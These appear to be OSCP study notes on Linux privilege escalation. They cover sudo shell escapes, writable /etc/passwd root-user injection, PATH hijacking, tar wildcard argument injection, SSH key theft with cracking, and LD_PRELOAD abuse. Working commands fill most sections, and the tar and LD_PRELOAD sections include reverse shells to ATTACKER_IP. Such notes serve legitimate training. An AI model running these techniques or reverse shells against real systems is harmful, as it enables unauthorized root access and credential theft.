2. SUDO Misconfiguration (Privilege Escalation Core)

Concept

  • sudo allows executing commands as root
  • Misconfigurations often allow command abuse or shell escape
  • This is one of the highest probability escalation vectors in OSCP

Initial Check

sudo -l

Always analyze output carefully:

  • Commands allowed without password (NOPASSWD)
  • Wildcard permissions
  • SETENV / environment preservation
  • Any binary with root execution rights

High-Risk Patterns

(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/less
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/awk
(root) NOPASSWD: /usr/bin/python
(root) NOPASSWD: /usr/bin/perl
(root) NOPASSWD: /usr/bin/tar *

Exploitation Strategy

Step 1 — Identify binary

sudo -l

Step 2 — Check GTFOBins

  • Search binary in GTFOBins
  • Check for “sudo” section specifically
  • Prefer shell escape methods first

Step 3 — Exploit pattern

Common Exploits

Vim / Vi

sudo vim -c ':!/bin/bash'

Less / More

sudo less /etc/passwd
!sh

Find

sudo find . -exec /bin/sh \; -quit

Awk

sudo awk 'BEGIN {system("/bin/bash")}'

Python

sudo python3 -c 'import os; os.system("/bin/bash")'

Perl

sudo perl -e 'exec "/bin/bash";'

Advanced Cases

  • Wildcard sudo commands → argument injection
  • SETENV enabled → LD_PRELOAD / PYTHONPATH abuse
  • Scripting binaries → file write + execution chain

Detection Checklist

  • Run sudo -l immediately
  • Check for NOPASSWD entries
  • Identify unsafe binaries (vim, less, find, awk, python, tar)
  • Check for wildcard usage (*)
  • Check SETENV or env_keep options

Why It Works

  • sudo executes binary as root
  • Many CLI tools allow shell escape features
  • Misconfigurations bypass intended restrictions
  • GTFOBins abuses native functionality, not exploits

OSCP Mental Trigger

If sudo allows any binary → check GTFOBins before thinking further

One-line Rule

sudo + unsafe binary = instant root candidate
2.5. Process Enumeration (Hidden Privilege Escalation)

Concept

  • Running processes often leak credentials, paths, and misconfigurations
  • Root-owned processes may execute insecure scripts or services
  • Local services (127.0.0.1) can expose hidden attack surfaces

Process Recon

ps aux
ps -ef
ps auxww

What to Look For

  • Credentials in command-line arguments (DB passwords, API keys, tokens)
  • Root processes running scripts from /tmp, /opt, /home
  • Custom binaries instead of system binaries
  • Services listening on localhost only (127.0.0.1)
  • Long-running processes behaving like hidden cron jobs

High-Value Filters

ps aux | grep root
ps aux | grep -E "python|bash|sh|perl|php"
ps aux | grep -i password
ps auxww | grep -v "\["

Key Indicators of Misconfiguration

  • Root executing scripts in writable directories
  • Processes launched with full credentials in args
  • Internal services not exposed externally
  • Unknown binaries running as root

Example Red Flags

root  /usr/bin/python /opt/app/app.py --db-pass=admin123
root  /tmp/backup.sh
root  /home/user/service --token=abcd1234

Why It Works

  • Process arguments are visible to all users
  • Misconfigured services expose sensitive data
  • Root processes often trust local environment
  • Internal services may be exploitable via port forwarding

OSCP Mental Trigger

Root process + non-system binary + exposed args = immediate investigation

6. /etc/passwd Writable → Root Escalation

Concept

  • Linux passwords normally stored in /etc/shadow
  • If hash exists in /etc/passwd, it overrides shadow
  • If writable → we can inject a root user
  • UID 0 = root privileges

Step 1 – Check Permissions

ls -l /etc/passwd
If you see: 
-rw-rw-rw-
→ World writable = vulnerable

Step 2 – Generate Password Hash

openssl passwd w00t
Example output: 
Fdzt.eqJQ4s0g

Step 3 – Inject Root User

echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
Format reminder: 
username:hash:UID:GID:comment:home:shell
Critical fields:
  • UID = 0
  • GID = 0

Step 4 – Switch User

su root2
Password: w00t

id
Expected: 
uid=0(root) gid=0(root)

Quick Exploit Flow

ls -l /etc/passwd
openssl passwd newpass
echo "pwn:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
su pwn
id

Why It Works

  • /etc/passwd hash overrides shadow
  • System trusts UID 0
  • No shadow access needed

OSCP Mental Trigger

If you see: 

WARNING: /etc/passwd world writable
→ Immediately think: Create UID 0 user
7. Writable Files & Misconfigured Permissions

Concept

  • Misconfigured file permissions can allow privilege escalation
  • Writable system files executed or read by root are high-impact targets
  • Focus is on files that influence authentication, execution, or scheduled tasks

Initial Recon

find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null

High-Value Targets (Priority Order)

  1. /etc/passwd
  2. /etc/shadow (rare but critical)
  3. /etc/sudoers
  4. /etc/crontab and /etc/cron.*
  5. systemd service files (/etc/systemd/system/)
  6. application config files (web apps, backups, scripts)

/etc/passwd Writable Exploitation

Step 1 — Verify permission

ls -la /etc/passwd

Vulnerable example:

-rw-rw-rw- 1 root root

Step 2 — Generate password hash

openssl passwd newpass

Step 3 — Inject privileged user

echo 'pwn:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

Critical field: UID = 0 (root privileges)

Step 4 — Switch user

su pwn
Password: newpass

id

Result

uid=0(root) gid=0(root)

Why It Works

  • /etc/passwd defines user identity mapping
  • UID 0 is always treated as root
  • If writable, attacker can inject privileged accounts
  • Shadow file is ignored when passwd contains valid hash

When It Works

  • /etc/passwd is world-writable or group-writable
  • No integrity protection (immutable flags absent)
  • System does not enforce strict auth hardening (rare but lab-common)

When It Fails

  • /etc/passwd is read-only (normal case)
  • Immutable flag set (chattr +i)
  • Shadow authentication enforced strictly

OSCP Mental Trigger

Writable /etc/passwd → immediate UID 0 injection attempt

One-liner Rule

Writable auth file + UID 0 injection = instant root escalation

10. PATH Hijacking (Privilege Escalation)

Concept

  • Linux resolves commands using the $PATH environment variable (left → right)
  • If a privileged process calls commands without absolute paths, resolution becomes attacker-influenced
  • This allows execution of malicious binaries in place of legitimate system commands
  • Impact escalates to root execution if the parent process runs with elevated privileges

When It Works

  • Root-owned script, cron job, or service executes commands indirectly
  • Commands are called without absolute paths (e.g. ls, cp, tar)
  • You can write to a directory that appears early in $PATH
  • Environment is not sanitized (no strict secure_path / env_reset enforcement)

Initial Recon

echo $PATH
env | grep PATH
ps aux
crontab -l
cat /etc/crontab
ls -lah /etc/cron*
systemctl list-timers --all

Find Execution Context

grep -R "system\|exec\|popen" /etc 2>/dev/null
grep -R "bash\|sh" /opt /usr/local 2>/dev/null

Step 1 — Identify Weak Command Usage

Look for scripts like:

tar czf backup.tar.gz *
cp /home/user/file /tmp/
service restart app
ls /tmp

Red flag: commands without full paths like /bin/ls

Step 2 — Confirm Writable PATH Control

find / -writable -type d 2>/dev/null | grep -E "tmp|home|var"
echo $PATH | tr ":" "\n"

Step 3 — Create Malicious Binary

echo -e '#!/bin/bash\n/bin/bash' > ls
chmod +x ls

Tip: name must match the missing system command exactly

Step 4 — Inject PATH Priority

export PATH=/tmp:$PATH

Ensure malicious directory is first in resolution order

Step 5 — Trigger Execution

sudo /path/to/script.sh
# or wait for cron/systemd trigger

Result

id
uid=0(root) gid=0(root)

Why It Works

  • Shell resolves commands using first match in PATH
  • Privileged process inherits attacker-influenced environment
  • Missing absolute paths allow substitution
  • Root executes attacker-controlled binary transparently

Common Real Targets

  • Root cron jobs executing maintenance scripts
  • Backup scripts in /opt or /usr/local/bin
  • CI/CD or deployment automation scripts
  • Legacy admin scripts calling system utilities

When It Fails

  • Commands use absolute paths (/bin/ls, /usr/bin/cp)
  • secure_path enforced in sudoers
  • env_reset strips PATH modification
  • No writable directory appears in PATH order

Detection Checklist

  • Check cron/systemd execution as root
  • Inspect scripts for missing absolute paths
  • Verify PATH order and writable directories
  • Confirm execution context (sudo / service / cron)

OSCP Mental Trigger

Root execution + missing absolute path + writable PATH entry = immediate hijack candidate

One-liner Rule

Command without full path + root context + controllable PATH = privilege escalation
11. Wildcard Injection / Filename Argument Injection (Privilege Escalation)

Concept

  • Occurs when a privileged command (usually via sudo) uses wildcards (*)
  • The shell expands filenames before execution
  • Filenames can be interpreted as command arguments or flags
  • Can lead to argument injection → command execution as root

Risk Pattern

sudo /usr/bin/tar -czvf /backup/backup.tar.gz *
sudo zip archive.zip *
sudo rsync -a * /backup/
sudo chown root:root *
sudo chmod 755 *

Key idea: the wildcard expands into attacker-controlled filenames.

How to Identify Valid Exploitation Flags (IMPORTANT)

You do NOT guess filenames. You derive them from the binary behavior.

Step 1 — Identify the sink (what matters)

  • Does the binary accept arguments starting with - or --?
  • Does it process files, archives, or external inputs?
  • Is it executed via sudo/root?
sudo -l
command --help
man command

Step 2 — Search only for dangerous keywords

Do NOT read the full help. Search only for:

exec
command
file
from
script
remote
rsh
rmt
checkpoint
to-command
transform

These keywords usually indicate: execution, external input, or argument parsing abuse

Step 3 — Convert flags into filenames

If a flag exists, you can turn it into a filename:

Flag Filename
--checkpoint=1 --checkpoint=1
--checkpoint-action=exec=cmd --checkpoint-action=exec=cmd
--files-from=/tmp/x --files-from=/tmp/x
--rsh=cmd --rsh=cmd

Exploitation Method (General)

  1. Identify sudo command with wildcard (*)
  2. Analyze binary for dangerous flags
  3. Create filenames matching those flags
  4. Trigger sudo execution

Example (tar abuse via checkpoint)

# Payload script
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1' >> shell.sh
chmod +x shell.sh

# Malicious filenames derived from tar flags
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=bash shell.sh"

# Trigger execution
sudo tar -czvf /tmp/backup.tar.gz *

Example (rsync argument injection)

# Flag discovered from help/man
# --files-from allows external file input

touch -- "--files-from=/tmp/payload"

sudo rsync -a * /backup/

Detection Checklist

  • Check sudo -l for commands using *
  • Identify binaries executed as root
  • Search help/man for dangerous flags
  • Look for execution-related options (exec, command, rsh)
  • Check if current directory is writable

Why It Works

  • Shell expands wildcard before execution
  • Filenames become CLI arguments
  • Binaries interpret arguments as options
  • Privilege context (sudo) escalates impact to root

OSCP Mental Trigger

If sudo command contains "*" → analyze for argument injection immediately

Golden rule: You don't invent filenames. You extract them from the binary's own options.

12. Password Hunting
grep -Ri "password" /home 2>/dev/null
cat ~/.bash_history
cat /var/www/html/config.php
Buscar claves privadas: 
find / -name id_rsa 2>/dev/null

Using SSH Private Keys

If you find a private key (id_rsa, .pem, .key), follow this process:

1. Verify Key


cat /home/user/.ssh/id_rsa

Look for:

-----BEGIN OPENSSH PRIVATE KEY-----

2. Copy Key to Your Machine

Manual copy:


nano id_rsa

Paste key content and save.

3. Fix Permissions


chmod 600 id_rsa

Important: SSH will reject the key if permissions are too open.

4. Use the Key


ssh -i id_rsa user@target

5. If Passphrase is Required


ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

6. Post-Exploitation Checks

  • Try different users with the same key
  • Try key on other machines (lateral movement)
  • Check authorized_keys files

cat ~/.ssh/authorized_keys

OSCP Mental Trigger

If you see a private key → immediately think:


Copy → chmod 600 → ssh → crack if needed

14. LD_PRELOAD Escalation (Privilege Escalation)

Concept

  • LD_PRELOAD allows loading custom shared libraries before system ones
  • If preserved in sudo, it can inject code into privileged execution
  • Leads to execution as root if misconfigured

Requirements

  • sudo -l shows SETENV or env_keep+=LD_PRELOAD
  • Binary is dynamically linked
  • Environment variables are not sanitized
sudo -l

Look for:

env_keep+=LD_PRELOAD
SETENV

Exploitation Method

Step 1 — Create malicious library

// shell.c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}

Step 2 — Compile shared object

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

Step 3 — Execute with sudo

sudo LD_PRELOAD=/tmp/shell.so /usr/bin/

Example

sudo LD_PRELOAD=/tmp/shell.so /usr/bin/apache2

Reverse Shell Variant

// shell.c
#include <stdio.h>
#include <stdlib.h>

void _init() {
    system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1");
}

Why It Works

  • LD_PRELOAD forces loading attacker-controlled library
  • _init() executes automatically on load
  • sudo preserves environment variables in misconfigured setups
  • Code runs inside privileged (root) context

When It Works

  • sudo allows environment variables
  • SETENV is enabled
  • Binary is dynamically linked
  • No secure_path restriction blocking LD_* variables

When It Fails

  • env_reset enabled in sudo
  • secure_path strips environment variables
  • Binary is static
  • LD_PRELOAD is explicitly blocked

OSCP Mental Trigger

If sudo preserves environment variables → LD_PRELOAD is a high-value escalation path
15. Writable File Escalation Priority List

Not all writable files are equal. Check in this order:

  1. /etc/sudoers (critical)
  2. /etc/passwd
  3. cron scripts (/etc/cron*, user crontab)
  4. .bashrc / .profile
  5. systemd service files
  6. web config files (wp-config.php, config.php)

High Value Targets


/etc/crontab
/etc/cron.d/*
/etc/systemd/system/*
~/.bashrc

OSCP Rule

If writable + executed by root → instant privesc candidate
